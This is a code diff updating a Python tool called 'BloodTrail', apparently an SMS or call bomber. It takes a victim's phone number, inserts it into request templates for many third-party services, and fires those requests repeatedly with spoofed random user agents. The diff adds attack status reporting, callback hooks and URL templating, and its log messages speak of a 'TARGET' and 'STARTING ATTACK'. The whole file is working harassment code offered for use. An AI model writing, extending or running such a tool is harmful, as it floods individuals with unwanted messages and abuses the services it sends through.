@@ -4,14 +4,48 @@ import aiohttp
 import json
 from fake_useragent import UserAgent
 from datetime import datetime
+from typing import Optional, Dict, Callable, Union
 
-__version__ = "1.5"
+__version__ = "1.5.1"
 
 
-def format_phone(raw_number, phone_pattern):
+class BomberStatus:
+
+    def __init__(self, callback: Optional[Callable] = None):
+        self.total_services = 0
+        self.completed_runs = 0
+        self.total_requests = 0
+        self.start_time = None
+        self.running = False
+        self.status_messages = []
+        self.callback = callback
+
+    def log(self, message: str):
+        self.status_messages.append(message)
+        if self.callback:
+            asyncio.create_task(self.callback(message))
+        print(f"{' ' : >20}{message}")
+
+    def get_report(self) -> str:
+        if not self.start_time:
+            return "Operation has not started yet."
+
+        elapsed = (datetime.now() - self.start_time).total_seconds()
+        report = [
+            "===== BOMBING OPERATION REPORT =====",
+            f"Total services: {self.total_services}",
+            f"Total requests: {self.total_requests}",
+            f"Completed runs: {self.completed_runs}",
+            f"Duration: {elapsed:.1f}s",
+            "====================================="
+        ]
+        return "\n".join(report)
+
+
+def format_phone(raw_number: str, phone_pattern: str) -> str:
     digits = re.sub(r"\D", "", raw_number)
     if len(digits) < 11:
-        raise ValueError(f"Wrong format.")
+        raise ValueError(f"Wrong phone number format.")
     formatted = phone_pattern
     for digit in digits:
         formatted = formatted.replace('X', digit, 1)
@@ -19,7 +53,7 @@ def format_phone(raw_number, phone_pattern):
 
 
 class Service:
-    def __init__(self, service_name, url, data, phone, timeout):
+    def __init__(self, service_name: str, url: str, data: Dict, phone: str, timeout: int, status: BomberStatus):
         self.service_name = service_name
         self.url = url
         self.data = data
@@ -28,76 +62,112 @@ class Service:
         self.next_run_time = 0
         self.runs_completed = 0
         self.ua = UserAgent()
+        self.status = status
 
     async def request(self):
         headers = {"User-Agent": self.ua.random}
-        print(f"{' ' : >20}STARTING REQUEST: '{self.service_name}' - ATTEMPT #{self.runs_completed}")
+        self.status.log(f"STARTING REQUEST: '{self.service_name}' - ATTEMPT #{self.runs_completed}")
+
         try:
             async with aiohttp.ClientSession() as session:
                 start_time = datetime.now()
-                async with session.post(self.url, json=self.data, headers=headers, timeout=10) as response:
+                async with session.post(
+                        self.url,
+                        json=self.data,
+                        headers=headers,
+                        timeout=10
+                ) as response:
                     result = response.status
                     duration = (datetime.now() - start_time).total_seconds()
-                    print(f"{' ' : >20}SERVICE: '{self.service_name}' - STATUS: {result} - TOOK: {duration:.2f}s")
+                    self.status.log(f"SERVICE: '{self.service_name}' - STATUS: {result} - TOOK: {duration:.2f}s")
                     return result
         except aiohttp.ClientError as e:
-            print(f"{' ' : >20}SERVICE: '{self.service_name}' - ERROR: Connection failed - {str(e)[:50]}")
+            self.status.log(f"SERVICE: '{self.service_name}' - ERROR: Connection failed - {str(e)[:50]}")
             return None
         except asyncio.TimeoutError:
-            print(f"{' ' : >20}SERVICE: '{self.service_name}' - ERROR: Request timeout")
+            self.status.log(f"SERVICE: '{self.service_name}' - ERROR: Request timeout")
             return None
         except Exception as e:
-            print(f"{' ' : >20}SERVICE: '{self.service_name}' - ERROR: {str(e)[:50]}")
+            self.status.log(f"SERVICE: '{self.service_name}' - ERROR: {str(e)[:50]}")
             return None
 
-    def should_run(self, current_time):
+    def should_run(self, current_time: int) -> bool:
         return current_time >= self.next_run_time
 
-    def update_next_run_time(self, current_time):
+    def update_next_run_time(self, current_time: int):
         self.next_run_time = current_time + self.timeout
         self.runs_completed += 1
-        print(
-            f"{' ' : >20}SERVICE: '{self.service_name}' - NEXT RUN IN {self.timeout}s - COMPLETED RUNS: {self.runs_completed}")
+        self.status.completed_runs += 1
+        self.status.log(
+            f"SERVICE: '{self.service_name}' - NEXT RUN IN {self.timeout}s - COMPLETED RUNS: {self.runs_completed}")
 
 
 class ServiceManager:
-    def __init__(self):
+    def __init__(self, status: BomberStatus):
         self.services = []
         self.start_time = None
         self.max_runs = 0
         self.running = False
+        self.status = status
 
-    def import_services(self, service_dict, phone):
+    def import_services(self, service_dict: Dict, phone: str):
+        def apply_phone_pattern(raw_phone: str, pattern: str) -> str:
+            digits = ''.join(filter(str.isdigit, raw_phone))
+            result = []
+            for ch in pattern:
+                if 'A' <= ch <= 'K':  # placeholder
+                    idx = ord(ch) - ord('A')
+                    result.append(digits[idx] if idx < len(digits) else '')
+                else:
+                    result.append(ch)
+            return ''.join(result)
+
         for service_name, service_data in service_dict.items():
             try:
-                formatted_phone = format_phone(phone, service_data["phone_pattern"])
-                service_data_copy = service_data["data"].copy()
-                for key, value in service_data_copy.items():
+                fmt_phone = apply_phone_pattern(phone, service_data.get("phone_pattern", ""))
+
+                raw_url = service_data.get("url", "")
+                if isinstance(raw_url, str) and "%PHONE%" in raw_url:
+                    formatted_url = raw_url.replace("%PHONE%", fmt_phone)
+                else:
+                    formatted_url = raw_url
+
+                data_copy = {}
+                for key, value in service_data.get("data", {}).items():
                     if isinstance(value, str) and "%PHONE%" in value:
-                        service_data_copy[key] = value.replace("%PHONE%", formatted_phone)
+                        data_copy[key] = value.replace("%PHONE%", fmt_phone)
+                    else:
+                        data_copy[key] = value
+
                 service = Service(
                     service_name=service_name,
-                    url=service_data["url"],
-                    data=service_data_copy,
-                    phone=formatted_phone,
-                    timeout=service_data["timeout"]
+                    url=formatted_url,
+                    data=data_copy,
+                    phone=fmt_phone,
+                    timeout=service_data.get("timeout", 0),
+                    status=self.status
                 )
                 self.services.append(service)
-                print(f"{' ' : >20}LOADED SERVICE: '{service_name}' - TIMEOUT: {service_data['timeout']}s")
+                self.status.log(f"LOADED SERVICE: '{service_name}' - TIMEOUT: {service_data.get('timeout')}s")
             except Exception as e:
-                print(f"{' ' : >20}FAILED TO LOAD SERVICE: '{service_name}' - ERROR: {str(e)[:50]}")
+                self.status.log(f"FAILED TO LOAD SERVICE: '{service_name}' - ERROR: {str(e)[:50]}")
 
-    async def run_service(self, service):
+    async def run_service(self, service: Service):
         await service.request()
 
-    async def start(self, max_runs):
+    async def start(self, max_runs: int):
+        global start_time
         if not self.services:
-            print(f"{' ' : >20}NO SERVICES LOADED")
+            self.status.log("NO SERVICES LOADED")
             return
 
-        print(f"{' ' : >20}STARTING SERVICES - TOTAL: {len(self.services)} - MAX RUNS: {max_runs}")
+        self.status.total_services = len(self.services)
+        self.status.log(f"STARTING SERVICES - TOTAL: {len(self.services)} - MAX RUNS: {max_runs}")
+
         self.running = True
+        self.status.running = True
         self.start_time = 0
+        self.status.start_time = datetime.now()
         self.max_runs = max_runs if max_runs is not None else float('inf')
 
         try:
@@ -107,9 +177,8 @@ class ServiceManager:
             while self.running:
                 current_time = self.start_time
 
-                if all(service.runs_completed >= self.max_runs for service in self.services) and self.max_runs != float(
-                        'inf'):
-                    print(f"{' ' : >20}ALL SERVICES COMPLETED {self.max_runs} RUNS EACH")
+                if all(service.runs_completed >= self.max_runs for service in self.services) and self.max_runs != float('inf'):
+                    self.status.log(f"ALL SERVICES COMPLETED {self.max_runs} RUNS EACH")
                     break
 
                 tasks = []
@@ -117,7 +186,7 @@ class ServiceManager:
                     if service.should_run(current_time) and service.runs_completed < self.max_runs:
                         tasks.append(asyncio.create_task(self.run_service(service)))
                         service.update_next_run_time(current_time)
-                        total_requests += 1
+                        self.status.total_requests += 1
 
                 if tasks:
                     await asyncio.gather(*tasks)
@@ -126,66 +195,91 @@ class ServiceManager:
                 await asyncio.sleep(1)
 
         except asyncio.CancelledError:
-            print(f"{' ' : >20}OPERATION CANCELLED")
+            self.status.log("OPERATION CANCELLED")
         except Exception as e:
-            print(f"{' ' : >20}ERROR IN SERVICE MANAGER: {str(e)}")
+            self.status.log(f"ERROR IN SERVICE MANAGER: {str(e)}")
         finally:
             elapsed = (datetime.now() - start_time).total_seconds()
             completed = sum(service.runs_completed for service in self.services)
 
-            print(f"{' ' : >20}OPERATION COMPLETE - DURATION: {elapsed:.1f}s")
-            print(f"{' ' : >20}TOTAL REQUESTS: {total_requests} - COMPLETED RUNS: {completed}")
+            self.status.log(f"OPERATION COMPLETE - DURATION: {elapsed:.1f}s")
+            self.status.log(f"TOTAL REQUESTS: {self.status.total_requests} - COMPLETED RUNS: {completed}")
             self.running = False
+            self.status.running = False
 
     def stop(self):
         if self.running:
-            print(f"{' ' : >20}STOPPING SERVICES...")
+            self.status.log("STOPPING SERVICES...")
             self.running = False
 
 
 class BloodTrail:
-    def __init__(self, config_path="data.json"):
+    _instance = None
+
+    def __new__(cls, *args, **kwargs):
+        if cls._instance is None:
+            cls._instance = super(BloodTrail, cls).__new__(cls)
+            cls._instance._initialized = False
+        return cls._instance
+
+    def __init__(self, config_path="data.json", status_callback: Optional[Callable] = None):
+        if getattr(self, "_initialized", False):
+            return
+
         self.config_path = config_path
-        self.service_manager = ServiceManager()
+        self.status = BomberStatus(callback=status_callback)
+        self.service_manager = ServiceManager(self.status)
         self.data = None
+        self._initialized = True
 
     async def load_config(self):
         try:
-            print(f"{' ' : >20}LOADING CONFIG: {self.config_path}")
+            self.status.log(f"LOADING CONFIG: {self.config_path}")
             with open(self.config_path, "r", encoding="utf-8") as f:
                 self.data = json.load(f)
-            print(f"{' ' : >20}CONFIG LOADED: {len(self.data['services'])} services found")
+
+            self.status.log(f"CONFIG LOADED: {len(self.data['services'])} services found")
             return True
         except FileNotFoundError:
-            print(f"{' ' : >20}CONFIG ERROR: File {self.config_path} not found")
+            self.status.log(f"CONFIG ERROR: File {self.config_path} not found")
             return False
         except json.JSONDecodeError:
-            print(f"{' ' : >20}CONFIG ERROR: Invalid JSON in {self.config_path}")
+            self.status.log(f"CONFIG ERROR: Invalid JSON in {self.config_path}")
             return False
         except Exception as e:
-            print(f"{' ' : >20}CONFIG ERROR: {str(e)}")
+            self.status.log(f"CONFIG ERROR: {str(e)}")
             return False
 
-    async def start(self, phone, runs):
-        print(f"{' ' : >20}INITIALIZING BLOODTRAIL FOR: {phone} - REPETITIONS: {runs}")
+    async def start(self, phone: str, runs: Union[int, str]):
+        if isinstance(runs, str):
+            try:
+                runs = int(runs)
+            except ValueError:
+                runs = 1
+
+        self.status.log(f"INITIALIZING BLOODTRAIL FOR: {phone} - REPETITIONS: {runs}")
 
         if not self.data and not await self.load_config():
-            print(f"{' ' : >20}FAILED TO INITIALIZE: Config not loaded")
+            self.status.log(f"FAILED TO INITIALIZE: Config not loaded")
             return False
 
         if not phone:
-            print(f"{' ' : >20}FAILED TO INITIALIZE: No phone number provided")
+            self.status.log(f"FAILED TO INITIALIZE: No phone number provided")
             return False
 
-        print(f"{' ' : >20}IMPORTING SERVICES FOR TARGET: {phone}")
+        self.status.log(f"IMPORTING SERVICES FOR TARGET: {phone}")
         self.service_manager.import_services(self.data["services"], phone)
 
-        print(f"{' ' : >20}STARTING ATTACK")
+        self.status.log(f"STARTING ATTACK")
         await self.service_manager.start(runs)
+        self.status.log(f"ATTACK COMPLETED")
         return True
 
     def stop(self):
         self.service_manager.stop()
+
+    def get_report(self) -> str:
+        return self.status.get_report()
 
 
 async def main():
